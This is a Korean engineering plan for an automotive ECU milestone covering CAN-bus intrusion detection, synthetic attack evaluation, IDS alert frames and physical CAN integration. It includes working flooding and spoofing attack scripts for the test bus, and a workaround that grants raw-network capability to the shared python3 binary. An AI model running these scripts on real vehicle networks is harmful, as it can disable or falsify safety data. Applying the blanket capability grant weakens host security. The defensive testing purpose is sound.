# ECU M4 — IDS, 공격 시뮬레이션, 물리 통합

> **2026-09-09 보안 방식 선별 반영:** 기존 단계·과제에 [하단 추가 수행·인수 조건](#security-adoption)을 함께 적용한다. 구현·시험 완료 기록은 아니다.

> **예시 상태**: 코드·명령은 별도 검증 표시가 없으면 작성 골격·예정 절차다. 실행 전 생성할 파일·의존성·플랫폼을 확인한다. [공동 규약](../common/00_협업_규약.md)의 문서·예시 사용 규칙을 따른다.

> 상위 계획: [ECU.md](../../ECU.md) · 통합 시험: [02_통합시험](../common/02_통합시험.md) · 인계: [01_연계_의존성](../common/01_연계_의존성.md)
> 원본: `_archive/ECU.md` M4, `_archive/ECU_최종_실행계획서.md` §8

---


<a id="security-integration"></a>
## 현행 과제에 병합한 보안 수행·인수 조건 — ECU-IDS-01 인증 진단 소비·공격 보강

이 절은 2026-09-09 보안 상세 계획을 기존 단계에 반영한 실행 조건이다. 초기 보안 보강 절과 함께 적용하며 제품 실행 완료 기록은 아니다. 상세 규칙은 [메시지·상태 규약](../../../docs/development/security/인증이벤트_메시지_상태규약.md)과 [송신·큐·실패 정책](../../../docs/development/security/인증이벤트_메시지_상태규약.md#planning-final)을 참조한다.

**선행 조건:** ECU/IVI M1 환경, IVI M3 producer 의미, 공동 채택 profile과 버전을 인수한다. 기존 raw/필수 IF 및 현재 0x200 계약은 유지한다.

**수행:** receiver에서 허용 신원·epoch/profile·5종 메시지·ready cutoff·최초 status·순번과 원장 보존식을 검사한다. Node A 소비 큐·가용성/불완전/과거 유실 기록을 분리하고 동일 event ID의 실제 IDS 진단 소비를 남긴다. 원격 이벤트를 CAN에 재주입하지 않는다.

**실패 대응·인계:** N03 Findings에 개별 Rule/IF/인증 진단의 근거를 남기고 결합 규칙은 calibration 후 고정한다. N04/N05는 기존 공격 진입점의 사전 거부→실제 주입→중지→sender 복구에 통합한다. Q1 A5/A6는 보조 사례이며 실패 종료 후 실제 재개 확인 전 다음 시행을 시작하지 않는다.

**완료 확인:**

- [ ] receiver 저장과 IDS 소비를 구분해 입증하고 사전 거부 0송신·sender 복구·raw/IF 회귀를 확인했다.
- [ ] 기존 공식 시험 결과와 추가 보조 시나리오의 실제 증거·미검증 사유를 구분했다.


## 1. 목적과 범위

정상 트래픽과 공격 트래픽에서 IDS 탐지 성능을 확보하고, 탐지 결과를 `0x200` IDS_Alert로 Node B까지 연결한다. Node A ↔ Node B 물리 CAN 통합을 완료한다.

이 단계는 합성 준비와 실시간 Isolation Forest·4종 공격·0x200 전송·물리 통합을 구현한다. 합성은 준비/분석이며 S-5=A의 실제 CAN 최종 평가를 대신하지 않는다.

| 항목 | 값 |
|---|---|
| 연결 요구사항 | FR-SEC-005~007 (공격·IDS·경보), FR-BSW-001~003 (물리 CAN)<br>**NFR-SEC-003** (공격별 탐지율 ≥90%), **NFR-SEC-004** (오탐율 ≤5%), **NFR-PERF-003** (탐지 응답 ≤3초) |
| 연결 시험 | TC-SEC-005-a~d, TC-SEC-006, TC-SEC-007, TC-INT-001~004 |
| 산출물 | 탐지 성능 측정 결과, 공격 트래픽 재현 스크립트, `0x200` 송신 경로, TARA v1 |
| 태그 | `v0.4.0` |

> **범위 결정 (S-5=A)**: 합성 평가는 준비·반복 분석용이다. 최종 4종 공격×3방어 구성 평가는 실제 CAN에서 수행한다. TC-SEC-007(`0x200` 전송 확인)과 IT-005(Flooding → AlertBanner 3초)를 포함한 실시간 경로도 유지한다. 합성 결과로 실제 CAN 인수를 대체하지 않는다.

---

## 2. 선행조건과 현재 구현 상태

**선행조건**: [M3](M3_EKF_Failsafe_SecOC.md) 완료 — SecOC 동작, ECU 정상 송신. IVI 측 대시보드가 `0x200`을 받을 준비 ([01_연계_의존성](../common/01_연계_의존성.md)).

**현재 구현 상태 (확인 기준일 2026-09-05, 실제 파일 확인)**

| 대상 | 상태 | 실제 내용 |
|---|---|---|
| `security/attacks/traffic_gen.py` | **구현됨** | 합성 트래픽 생성기. `Frame(t, can_id, dlc, data, label, attack_type)`. **공격 5종**: flooding(0x000, 3000 fps), fuzzy(랜덤 ID, 500 fps), replay(0x100 20Hz 재생), spoofing(0x100 12Hz 조작 payload), **masquerade**(0x100 정지 후 10Hz 위장) |
| `security/ids/feature_extractor.py` | **구현됨** | 1초 슬라이딩 윈도우 7차원 |
| `security/ids/rule_baseline.py` | **구현됨** | 방향성 z-score 규칙 베이스라인 + `roc_auc()`, `metrics_at()` |
| `security/ids/spec_detector.py` | **구현됨** | per-ID 사양기반 탐지기(화이트리스트·주기·payload 동결) |
| `security/ids/if_detector.py` | **소스 존재(가드)** | `IsolationForestDetector`, `RANDOM_STATE=42`. sklearn 미설치 시 SKIP |
| `security/experiments/run_eval.py` | **구현됨** | 탐지율·오탐율·ROC-AUC·공격별 탐지율·탐지지연·멀티 seed 재현성 산출 |
| `security/tests/test_ids_baseline.py` | **구현됨** | 특징 차원, AUC 하한, 볼륨형 공격 탐지, masquerade 회복, seed 재현성 |
| **실시간 경로** | **구현됨(CHG-007/013), 실장비 인수 대기** | `security/ids/runtime.py`, `security/capture_normal.py`, `security/attack_simulator.py`; `0x200` 송신과 4종 제한형 CLI 존재 |
| `docs/TARA.md` | **존재** | 초안이 아니라 문서가 이미 있음. M4는 IDS 실측 결과 반영 작업 |

### 해소한 drift와 충돌

| 항목 | 문서/계획 | 실제 구현 | 결정 |
|---|---|---|---|
| **IDS 특징 벡터** | `docs/SDD-ECU.md` §3.9.1: `id_mean`, `id_std`, `interval_mean`, `interval_std`, `msg_count`, `payload_mean`, `payload_std` | `feature_extractor.py`: `msg_rate`, `mean_iat`, `std_iat`, `unique_ids`, `id_entropy`, `payload_change`, `max_id_burst` | **구현을 기준으로 한다** (사용자 판단). 2026-09-08 SDD-ECU §3.9.1을 실제 특징명·순서·단위로 동기화했다. [M6](M6_문서_품질.md)에서는 후속 변경 여부를 확인한다. 특정 공격 탐지 보장은 실행한 탐지기·조건별 증거로만 판단한다 |
| `0x200` 타임스탬프 pack | 세대A `struct.pack('>BBHi', ...)` — **signed** int | 세대B `'>BBHI'` — unsigned | **`>BBHI`**. ICD §1.5가 uint32다. signed면 2038년 이후 또는 상위 비트에서 음수로 해석된다 |
| AnomalyScore 클램프 | 세대A `min(int(score/0.01), 255)` — 음수 미처리 | 세대B `max(0, min(int(round(score/0.01)), 255))` | **세대B**. 이상 점수는 음수가 될 수 있다 |
| 공격 종류 | 4종 (fuzzy/replay/spoofing/flooding) | **5종** (+ masquerade) | 실제 기준. masquerade는 규칙 베이스라인이 놓치고 사양기반이 잡는 핵심 대비 사례다 |

---

## 3. 수행 절차

### 3.1 Python 환경

```bash
cd security
python3 -m venv .venv
. .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt
cd ..                        # 이후 명령·results 경로는 저장소 루트 기준
```

현재 `security/requirements.txt`가 요구하는 것:

```text
numpy>=1.24
scikit-learn>=1.3      # Isolation Forest IDS (security/ids/if_detector.py)
pandas>=2.0            # 공개 데이터셋(HCRL/ROAD/SynCAN) 로딩
python-can>=4.0        # vcan0/실 CAN 송수신·캡처
pytest>=7.0            # 단위 테스트 (security/tests/)
```

> 규칙 베이스라인·사양기반 탐지기·`analysis/`·`attacks/traffic_gen.py`는 **표준 라이브러리만으로 동작한다.** 위 패키지가 없어도 오프라인 평가의 상당 부분이 돌아간다. sklearn이 없으면 Isolation Forest 비교만 SKIPPED로 표시된다.

```bash
python3 -c "import can; print(can.__version__)"          # 기대: 4.x.x
python3 -c "from sklearn.ensemble import IsolationForest; print('OK')"
```

SocketCAN 권한(실시간 경로에서만 필요):

```bash
# CAN 인터페이스 설정은 Node A Linux의 관리자 작업이다.
# python-can 송수신 권한은 대상 OS에서 확인한다. dialout 가입으로 CAN 권한을 가정하거나
# 공유 Python 실행 파일 전체에 capability를 부여하지 않는다.
```

### 3.2 오프라인 평가 실행 — 준비·분석 경로

```bash
python security/experiments/run_eval.py
```

이 러너가 하는 일:

1. `traffic_gen`으로 정상 + 5종 공격 트래픽을 seed 고정으로 생성
2. 정상 윈도우로 규칙 베이스라인과 사양기반 탐지기를 학습
3. 탐지율 / 오탐율 / ROC-AUC / 공격별 탐지율 / 탐지지연 산출
4. 멀티 seed로 재현성 편차 측정
5. sklearn이 있으면 Isolation Forest 비교도 함께 출력

**결과를 기록할 때 지켜야 할 것:**

- [ ] 합성 트래픽 결과를 **실제 CAN 실측으로 표시하지 않는다.** 표 제목과 캡션에 "합성"을 명시한다
- [ ] "규칙 vs 사양 vs Isolation Forest" 비교와 [M5](M5_Ablation.md)의 "무방어 / SecOC only / SecOC+IDS" 방어 구성 비교는 **다른 축**이다. 한 표에 섞지 않는다
- [ ] seed, 임계, 분모(윈도우 수), 환경, 재현 명령을 함께 남긴다

### 3.3 탐지 성능이 기준에 미달할 때

```bash
python -m pytest security/tests/test_ids_baseline.py -v
```

현재 시험이 강제하는 하한:

| 시험 | 기준 |
|---|---|
| `test_feature_vector_shape` | 특징 7차원 |
| `test_baseline_auc_above_floor` | ROC-AUC ≥ 0.75 |
| `test_volumetric_attacks_detected` | flooding ≥ 0.9, fuzzy ≥ 0.9, FPR ≤ 0.05 |
| `test_spec_recovers_masquerade` | 규칙은 masquerade < 0.5, 사양기반 ≥ 0.9, FPR ≤ 0.05 |
| `test_reproducibility_across_seeds` | seed 전반 최소 탐지율 ≥ 0.9 |

미달 시 조정 순서:

1. **임계(threshold)** 를 먼저 움직인다. 탐지율과 오탐율은 트레이드오프이므로 ROC 곡선에서 동작점을 고른다
2. Isolation Forest의 `contamination`을 낮추면 기본 predict에서 더 적은 학습 표본을 이상으로 분류하도록 offset이 변한다. 민감도가 높아진다는 뜻이 아니다. 현재 클래스 기본값은 0.05이며 튜닝/평가를 분리해 TPR/FPR를 확인한다(SDD-ECU §3.9.3). `RANDOM_STATE=42`는 재현성을 위해 고정한다
3. 특징을 추가할 때는 `FEATURE_NAMES`와 `_DIRECTION`(규칙 베이스라인)을 함께 갱신한다
4. 학습 윈도우 수가 부족하면 `traffic_gen`의 `duration`을 늘린다

> 임계나 특징을 바꾸면 [M5](M5_Ablation.md)의 Ablation 수치도 다시 뽑아야 한다. 순서를 M4에서 확정하고 넘어간다.

### 3.4 공격 재현 — 오프라인

`traffic_gen.gen_attack(attack, duration, rng, t0)`가 공격별로 만드는 패턴이다. 실 CAN TC-SEC-005를 준비하는 입력 패턴 참고로 쓴다. 합성 생성 성공은 해당 TC 통과가 아니다.

| 공격 | 주입 패턴 | TC-SEC-005 판정 |
|---|---|---|
| `flooding` | CAN ID `0x000`, 3000 fps (DLC=8, 버스 점유율 81%) | -d: **버스 점유율 ≥50%** (아래 참조) |
| `fuzzy` | 랜덤 11비트 ID, 랜덤 payload, 500 fps | -a: ID 표준편차 > 100 |
| `replay` | 캡처한 `0x100` 프레임을 20Hz로 재생 (정상 10Hz) | -b: payload 바이트 일치 |
| `spoofing` | `0x100`에 SOC raw 200(`0xC8`) 조작 payload 12Hz 추가 | -c: `payload[0] == 200` |
| `masquerade` | `0x100` 배경 제거 후 동일 10Hz·고정 payload 위장 | (TC 없음. 사양기반 탐지 근거) |

> **TC-SEC-005-d 기준 (TEST_PLAN v1.4에서 정정됨)**: 기준이 "1초 내 프레임 ≥5,000"에서 **"버스 점유율 ≥50%"** 로 바뀌었다. 이유: 프레임 수만 세면 강도를 역전 평가한다. DLC=8 · 3,000 fps는 버스의 **81%**를 점유하지만 5,000 미만이라 옛 기준에서 탈락하고, DLC=0 · 5,000 fps는 **55%**만 점유하면서 통과한다. DLC=8·3,000 fps 설정만으로 실버스 합격을 선언하지 않는다. 실제 전송률·프레임 구성·점유율을 측정해 공식 기준으로 판정한다. 위 점유율 수치는 해당 프레임 길이 가정의 계산 예시다.
> - [ ] 점유율은 실제 캡처/계측으로 판정한다. `security/analysis/measure_can_secoc.py`는 정해진 가정의 계산 참고다
> - [ ] 정상/공격의 실제 부하를 각각 측정하며 고정 계산값에서 탐지 가능성이나 지연 보장을 추론하지 않는다

```bash
python security/analysis/measure_can_secoc.py
# frame_bits / max_frames_per_sec / 버스 점유율(%) / SecOC 버스 부하 / MAC 위조 기대시간 / HMAC 실측 소요
```

### 3.5 실시간 경로 — TC-SEC-007 / IT-005 최소 구현

ECU-IDS-01 병합 인수 조건: 아래 규칙/사양 예시는 경보 전송의 최소 사전 검증이다. FR-SEC-006의 실시간 Isolation Forest 구현·모델 저장/로드·윈도우 점수 시험은 필수로 남는다. IF 의존성 누락으로 SKIPPED인 경우 독립 검토는 진행할 수 있지만 IDS 전체 완료 체크는 통과시키지 않는다.

오프라인 평가만으로는 `0x200` 송신을 증명할 수 없다. CHG-007/013에서 `security/ids/runtime.py`의 SocketCAN 수신·명시적 정상 캡처 학습·`0x200` 송신과 `security/attack_simulator.py`의 4종 CLI를 구현했다. 아래 조각은 설계 이력이며 완료 판정은 실제 `can0`에서 IT-005 증거를 받아야 한다.

**(1) `0x200` 송신기** — `security/ids/ids_alerter.py` (신규)

```python
#!/usr/bin/env python3
"""IDS 탐지 결과를 CAN 0x200 (IDS_Alert)으로 전송한다. ICD §1.5."""
import struct
import time

ATTACK_TYPES = {"none": 0, "fuzzy": 1, "replay": 2, "spoofing": 3, "flooding": 4}


def build_alert(attack_type: str, anomaly_score: float,
                suspect_can_id: int = 0xFFFF, now: int | None = None) -> bytes:
    """ICD §1.5: AttackType(1) | AnomalyScore(1, x0.01) | SuspectCANID(2 BE) | Timestamp(4 BE)"""
    if attack_type not in ATTACK_TYPES:
        raise ValueError("unsupported ICD attack type")
    type_code = ATTACK_TYPES[attack_type]
    score_raw = max(0, min(int(round(anomaly_score / 0.01)), 255))
    timestamp = (now if now is not None else int(time.time())) & 0xFFFFFFFF
    return struct.pack(">BBHI", type_code, score_raw, suspect_can_id, timestamp)


def send_alert(bus, attack_type: str, anomaly_score: float,
               suspect_can_id: int = 0xFFFF) -> None:
    import can
    bus.send(can.Message(arbitration_id=0x200,
                         data=build_alert(attack_type, anomaly_score, suspect_can_id),
                         is_extended_id=False))
```

`python-can` 없는 포맷 시험을 지원하려면 아래처럼 import를 `send_alert()` 내부에 둔다. 모듈 최상위에서 import하면 함수가 순수해도 의존성이 필요하다.

```python
# security/tests/test_ids_alerter.py (신규)
from ids.ids_alerter import build_alert

def test_alert_frame_format():
    data = build_alert("flooding", 2.55, 0x0100, now=0x01020304)
    assert len(data) == 8
    assert data[0] == 4          # AttackType = Flooding
    assert data[1] == 255        # AnomalyScore 2.55 / 0.01
    assert data[2:4] == b"\x01\x00"
    assert data[4:8] == b"\x01\x02\x03\x04"

def test_score_is_clamped():
    assert build_alert("fuzzy", -1.0)[1] == 0
    assert build_alert("fuzzy", 99.0)[1] == 255
```

경보 유형은 관측 입력으로 분류해야 하며 평가기의 정답 라벨·공격 CLI 선택값을 탐지기에 전달해 유형 추론 성공으로 보고하지 않는다. IF의 이진 점수는 4종 분류기 자체가 아니다. 미지원/미확정 유형을 None(0)으로 바꾸는 오류는 거부하고, wire 확장이 필요하면 계약 영향안을 작성한다.

**(2) 실시간 탐지 루프** — 기존 자산을 재사용한다. 새 특징 추출기를 만들지 않는다.

```python
# 개요: python-can으로 1초 윈도우를 모아 feature_extractor.extract()에 넣고,
#       학습된 탐지기(rule_baseline 또는 spec_detector)의 점수가 임계를 넘으면
#       ids_alerter.send_alert()로 0x200을 송신한다.
#
#   bus = can.interface.Bus(channel="vcan0", interface="socketcan")
#   window = []
#   while True:
#       msg = bus.recv(timeout=1.0)
#       ... 1초 경계에서 extract(window) -> score -> 임계 초과 시 send_alert(...)
```

- [ ] 탐지 지연이 IT-005의 3초 예산 안에 드는지 확인한다 (윈도우 1초 + 판정 + 송신)
- [ ] IVI 담당자에게 `0x200` 첫 실송신 시점을 통보한다

**(3) 실 CAN 공격 스크립트** — 데모·통합시험용

`traffic_gen.py`는 합성 트래픽 **리스트**를 만들 뿐 실제 버스로 보내지 않는다. IT-004·IT-005와 데모 시나리오 B는 **실제 프레임 송신**이 필요하므로 아래 두 개를 만든다. 여러 문서(`02_통합시험`, `03_발표_제출`, 양측 M8, `M6`·`M7`)가 이 두 파일을 호출한다.

```python
# security/attacks/flooding_attack.py (신규)
#!/usr/bin/env python3
"""Flooding 공격 — 버스 점유율을 높인다. TC-SEC-005-d 기준은 bus load >=50%."""
import argparse
import time

import can


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--channel", default="vcan0")
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--dlc", type=int, default=0, choices=[0, 8],
                    help="0=경차(짧은 프레임, 높은 fps) / 8=트럭")
    args = ap.parse_args()

    bus = can.interface.Bus(channel=args.channel, interface="socketcan")
    # 최고 우선순위 ID(0x000)로 최대한 촘촘히 — 버스를 선점한다
    msg = can.Message(arbitration_id=0x000,
                      data=bytes(args.dlc), is_extended_id=False)
    end = time.time() + args.duration
    n = 0
    try:
        while time.time() < end:
            bus.send(msg)
            n += 1
    finally:
        bus.shutdown()
    print(f"flooding: {n} frames in {args.duration}s (DLC={args.dlc})")


if __name__ == "__main__":
    main()
```

```python
# security/attacks/spoofing_attack.py (신규)
#!/usr/bin/env python3
"""Spoofing 공격 — 조작된 0x100(SOC=100%)을 주입한다. SecOC OFF면 수용된다.

인증 프레임(0x102)을 만들 수 없으므로, SecOC ON인 수신 측은 이 프레임을 폐기한다.
이것이 데모 시나리오 B의 1(무방어)-2(SecOC 차단) 대비를 만든다.
"""
import argparse

import can


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--channel", default="vcan0")
    ap.add_argument("--count", type=int, default=5)
    args = ap.parse_args()

    bus = can.interface.Bus(channel=args.channel, interface="socketcan")
    # ICD §1.2: SOC raw 200(=100%), SOH 190(=95%), 42.00V, -2.0A, 25C, reserved 0
    fake = can.Message(
        arbitration_id=0x100,
        data=bytes([200, 190, 0x10, 0x68, 0xFF, 0xEC, 65, 0x00]),
        is_extended_id=False,
    )
    try:
        for _ in range(args.count):
            bus.send(fake)
    finally:
        bus.shutdown()
    print(f"spoofing: {args.count} frames (SOC=100% 조작)")


if __name__ == "__main__":
    main()
```

- [ ] 두 스크립트 모두 `--channel`을 받는다 (`--interface`가 아니다 — python-can 관례)
- [ ] `measure_can_secoc.py`는 비트 수·이론 부하 계산과 실행 호스트 HMAC 시간 측정용이다. 실제 CAN 점유율 측정 증거로 사용하지 않는다.
- [ ] TC-SEC-005-d는 실제 물리 CAN 캡처의 프레임 수·측정 시간·DLC·비트레이트·오류/드롭과 사용한 부하 산정 방법을 기록한다. 계측기 관측값과 비트 수 기반 추정값을 구분한다. vcan 결과로 물리 버스 점유율을 판정하지 않는다.
- [x] 별도 중복 스크립트 대신 공통 `security/attack_simulator.py --type fuzzy|replay|spoofing|flooding` 진입점을 구현했다. S-5=A에 따른 4종 실제 CAN 최종 평가는 아직 별도 실행해야 한다
- [ ] 공격 도구는 **격리된 `vcan0` 또는 전용 테스트베드에서만** 실행한다 (SKILL 보안 규칙)

### 3.6 물리 CAN 통합

```bash
# Node B
candump can0

# Node A
cansend can0 100#DEADBEEF
```

```bash
# Node A
candump can0

# Node B
cansend can0 200#CAFEBABE
```

양방향 수신이 확인되면 ECU를 실제 인터페이스로 띄운다.

```bash
./adaptive_ecu/build/adaptive_ecu --interface can0 --secoc on --sensor-mode profile_csv
```

배선·종단 저항·비트레이트는 [02_통합시험](../common/02_통합시험.md)을 따른다.

### 3.7 IT-001~005 수행

절차 전문은 [02_통합시험](../common/02_통합시험.md)에 있다. ECU 측 준비 사항만 여기 둔다.

| IT | 공식 TC | ECU 측 준비 |
|---|---|---|
| IT-001 | TC-INT-001 | `--interface can0`로 정상 송신 |
| IT-002 | TC-INT-003 | SOC 4.5%가 되도록 프로파일 또는 강제 입력 → `0x101` 발생 |
| IT-003 | TC-INT-002 | Node B와 동일 키 배치 후 `--secoc on` |
| IT-004 | TC-INT-002 | 변조 MAC 주입 (Node B가 `ERR_HMAC_VERIFY_FAIL` 후 값 미갱신) |
| IT-005 | TC-INT-004 | Flooding 주입 → IDS 탐지 → `0x200` 송신 |

- [ ] 결과를 `docs/TEST_PLAN.md`에 기록한다
- [ ] M4 동작 영상을 촬영한다 ([03_발표_제출](../common/03_발표_제출.md))

### 3.8 TARA 갱신

`docs/TARA.md`에 M4 실측을 반영한다. ISO 21434 구조를 유지한다.

1. **자산**: CAN 통신 데이터, BMS 상태값, SecOC 공유 키(`/etc/secoc/key.bin`), IDS 모델·임계, Fail-safe 제어 권한
2. **STRIDE**
   - Spoofing: 가짜 BMS 데이터 주입 (`0x100`)
   - Tampering: 전송 중 페이로드 변조
   - Repudiation: 공격 출처 부인
   - Information Disclosure: CAN 트래픽 도청
   - Denial of Service: Flooding으로 버스 마비
   - Elevation: Fail-safe 상태 우회
3. **Feasibility Rating**: 공격 난이도 × 영향도
4. **위협 처리**: SecOC(인증) / IDS(탐지) / Fail-safe(완화)

- [ ] 각 위협에 대응하는 **실측 근거**(탐지율, MAC 위조 기대시간 등)를 연결한다. 목표값과 실측값을 구분해 표기한다

---

## 4. 검증 명령과 합격 기준

```bash
# 오프라인 (준비·분석 경로)
python security/experiments/run_eval.py
python -m pytest security/tests -v
python security/analysis/measure_can_secoc.py

# 실시간 최소 경로
python -m pytest security/tests/test_ids_alerter.py -v

# 물리 CAN
candump can0        # 상대 노드에서 cansend 후 수신 확인
```

| TC | 합격 기준 | 경로 |
|---|---|---|
| TC-SEC-005-a | Fuzzy ID 표준편차 > 100 | 오프라인 |
| TC-SEC-005-b | Replay payload 일치 | 오프라인 |
| TC-SEC-005-c | Spoofing `payload[0] == 200` | 오프라인 |
| TC-SEC-005-d | 1초 측정 구간의 버스 점유율 ≥50% — TEST_PLAN·§3.4의 캡처/계측·손실·산정법 기록 | 실제 물리 CAN 필수; 합성/`vcan0`은 사전 검증 |
| TC-SEC-006 | 탐지율·오탐율 목표 달성 | 오프라인 |
| TC-SEC-007 | `0x200` 프레임 수신 확인 | **실시간 필수** |
| TC-INT-001~004 | [02_통합시험](../common/02_통합시험.md) | 실시간 필수 |

---

## 5. 실패 시 대응과 우회

**sklearn 미설치 / 설치 실패**
- 규칙 베이스라인과 사양기반 탐지기는 표준 라이브러리만으로 돈다. Isolation Forest 비교만 SKIPPED로 남기고 진행한다
- 발표·문서에서 "IF 결과 없음"을 숨기지 않고 명시한다

**python-can SocketCAN 권한 오류**
```bash
sudo setcap cap_net_raw+eip $(readlink -f $(which python3))
# 또는 sudo python3 <script>
```

**탐지율 90% 미달**
1. 임계를 ROC 곡선 기준으로 재선정 (탐지율 ↔ 오탐율 트레이드오프)
2. masquerade처럼 볼륨이 정상인 공격은 규칙 베이스라인으로 잡히지 않는다 — 사양기반 탐지기 결과를 본다
3. 특징 추가 시 `FEATURE_NAMES`와 규칙 `_DIRECTION`을 함께 갱신
4. 그래도 미달이면 **완화된 기준으로 통과 처리하지 않고** 미달 사실과 원인을 기록한다

**물리 CAN 양방향 실패**
- 비트레이트 양측 500000 일치 확인
- 종단 저항 120Ω 두 지점 확인
- 한쪽만 수신되면 배선(CANH/CANL) 교차 확인
- 미해결 시 `vcan0` + 단일 노드 데모로 우회하되 **IT-001~005는 미완료로 표기한다**

---

## 6. 완료 체크리스트

- [ ] `run_eval.py` 실행 결과 확보 (탐지율·오탐율·AUC·공격별·지연·seed 편차)
- [ ] `pytest security/tests` 전 항목 통과
- [ ] 합성 결과와 실측 결과를 문서에서 구분해 표기
- [ ] 탐지기 비교(규칙/사양/IF)와 방어 구성 비교를 분리해 기록
- [ ] TC-SEC-005-d의 승인된 부하 ≥50% 기준 적용, 실제 캡처/계측 근거 인수
- [ ] `ids_alerter.build_alert()` + 포맷 시험 통과 (TC-SEC-007)
- [ ] 실시간 탐지 루프로 `0x200` 실송신 확인
- [ ] 물리 CAN 양방향 통신 성공
- [ ] IT-001~005 수행, 결과 `docs/TEST_PLAN.md` 기록
- [ ] `docs/TARA.md` 실측 반영, 목표값·실측값 구분
- [ ] M4 동작 영상 촬영
- [ ] `v0.4.0` 태그 생성


### 요구 의미 검토 후 확인할 실험 경계

공동 매핑 MAP-06의 범위 충돌은 S-5=A로 실제 CAN 최종 평가 방향을 확정했다. 합성 결과와 실기기 결과를 분리하고 공식 TEST_PLAN의 실험 조건·합격 기준을 적용한다. 실기기 실행은 아직 미완료다.

IDS 증적에는 `decision_function / anomaly / wire_score` 종류를 기록한다. 현 소스에서 anomaly는 raw 부호 반전, wire_score는 정상 학습 범위 기반 정규화다. TEST_PLAN의 정상 raw 평균>공격 raw 평균을 부호 반전값에 그대로 적용하지 않는다. 학습/보정 파라미터와 임계·입력 범위는 평가 전에 고정한다.


<a id="ecu-ids-01"></a>
### ECU-IDS-01 — Plan 승계 과제

원문: [ECU.md](../../_archive/plan_20260908/ECU.md.txt)의 ECU-IDS-01. 실행 상태는 해당 역할의 진행 표·공동 인수 기록을 사용한다. 이 병합은 과제 실행 완료가 아니다.

선행·착수: [ECU-CAN-01](M2_CAN_CDD_Publisher.md#ecu-can-01), [ECU-SEC-01](M3_EKF_Failsafe_SecOC.md#ecu-sec-01)

보존한 수행·인수 조건: 공식 4종 공격 CLI의 선택·중지·실프레임을 시험한다. 정상 데이터/라벨·학습/평가 분리·모델 저장/로드·실시간 윈도우·IF 점수·0x200 송신을 연결한다. 합성 배경 ID와 정상 ICD 트래픽을 구분하고 IVI에 공격 시각·경보를 인계한다. masquerade 연구는 공식 4종을 대체하지 않는다.

현재 기준 적용: FR-SEC-006 IF 필수 조건 승계; 규칙/사양 최소 경로 및 SKIPPED는 대체 합격 아님. 본문의 공식 FR/TC·승인 정책·실패 대응을 함께 적용한다.


<a id="security-adoption"></a>
## 보안 차용 보강 — 온라인 검사·인증 이벤트·공격 도구

### 목적·선행조건

ECU-IDS-01에 N02~N05와 Q1=A·Q2=B를 연결한다. Node A 별도 IDS와 FR-SEC-006의 IF 인수는 유지한다. Rule/Spec을 먼저 검증하되 IF의 SKIPPED를 합격으로 바꾸지 않는다. [공동 Q2 설계 관문](../common/01_연계_의존성.md#security-adoption), IVI verifier 이벤트 의미, 적용 ICD 버전을 확인한다.

### 수행 절차 — 검사와 도구

| 입력·도구 | 추가 수행 | 출력·검증 |
|---|---|---|
| raw CAN, 기존 Rule/Spec | ID/DLC·버전별 필드·주기/rate·누락·range/jump/freeze/plausibility 검사. 통계 학습과 ICD 규칙을 분리 | reason·기대값·관찰값·단위·severity·규칙/프로파일 버전·근거 ID |
| 독립 timer | 프레임이 전혀 없어도 deadline 검사 | raw 0x100 도착과 Node B의 인증된 유효 수신을 구분, 위조 도착만으로 유효 수신을 추론하지 않음 |
| 기존 feature/IF | 고정 특징·모델 저장/로드·온라인 윈도우 판정 | raw decision/anomaly/wire 점수 종류, 모델·특징 hash, 개별 판정. 미계산 feature 기여도를 생성하지 않음 |
| Q2 검증 이벤트 | 계약 확정 후 Node B 사건의 출처·부팅·순번·중복을 검증하고 실패 burst를 집계 | 실제 수신·집계 시각·유실/오류/단절. 단순 사후 분석으로 실시간 완료 처리 금지 |
| IDS 결합·alerter | Rule/IF/인증 이벤트 개별 결과와 결합 규칙을 calibration에서 고정 | 기존 0x200만 사용, 미지원 유형은 로컬 기록. 정상(None)·다른 공격으로 오매핑 금지 |

원천의 `online_ids.py`를 새 경쟁 진입점으로 추가하지 않는다. 주 진입점은 `security/ids/runtime.py`로 확정했다. `run_eval.py`는 합성 탐지기 비교 책임을 유지하며 실시간 제품 경로로 사용하지 않는다. YAML 프로파일을 채택할 경우 로더 의존성과 ICD 버전 검증을 확인하고 수작업 계약 복제본으로 관리하지 않는다.

Q2 연결부와 raw 수집·분석·로깅은 유한 큐와 예외 격리로 ECU 제어 루프를 막지 않도록 한다. raw/IF 판정은 전달 채널 단절에도 계속 수행하고, 인증 이벤트 관찰 불가를 진단한다. 경보나 이벤트 실패가 안전 정지 명령으로 바뀌지 않도록 한다.

### 수행 절차 — 공격기와 입력 출처

1. 기존 4종 실제 공격 CLI·공통 `attack_simulator.py --type` 계획에 전송 전 허용 인터페이스·격리 확인·rate/duration 상한 검사를 연결한다. 원천의 별도 runner/옵션명은 구현 후보이며 새 중복 CLI를 만들지 않는다. 인터페이스 이름만으로 격리를 증명하지 않는다.
2. 잘못된 대상·확인 누락·상한 초과는 첫 송신 전에 거부한다. 상한은 물리 조건과 공식 flood 강도를 함께 검토하여 정하고 근거 없이 숫자를 넣지 않는다.
3. Q1=A의 A5는 정상 0x100 sender를 실제 중단·재개하고, A6는 중단 후 정상 주기의 key 없는 위조 프레임으로 대체한다. 시험용 제어는 test build 또는 외부 orchestration에 한정하며 제품 명령/reset API로 노출하지 않는다.
4. 정상 sender·공격기의 책임과 시작/종료·예외·중단 후 정상 재개를 기록한다. 공격 시작은 명령 실행이 아닌 실제 첫 주입/중단 관측으로 남긴다. 반복 수는 pilot 후 정하고 600회 공식 확대를 자동 추가하지 않는다.
5. ECU M3의 profile/source_mode·hash·seed와 raw/라벨을 연결한다. drift·센서 고장은 CAN 공격 라벨과 구분하고 정상 고정값을 freeze 공격으로 자동 분류하지 않는다.

### 검증

기존 TC-SEC-005~007 및 대응 단위 시험에 정상/잘못된 ID·DLC·필드·무수신 timer·급변·고착·정상 jitter·모델 오류·예외 격리·중복 경보·점수 clamp를 연결한다. N03 기대/관찰값이 재현되어야 한다. N04 거부 입력은 송신 0건, N05 오류 종료는 sender 상태·재개 결과로 증명한다. Q2는 [공동 통합](../common/02_통합시험.md#security-adoption)의 실제 전달 시험으로 인수한다.

### 실패 대응·완료 체크

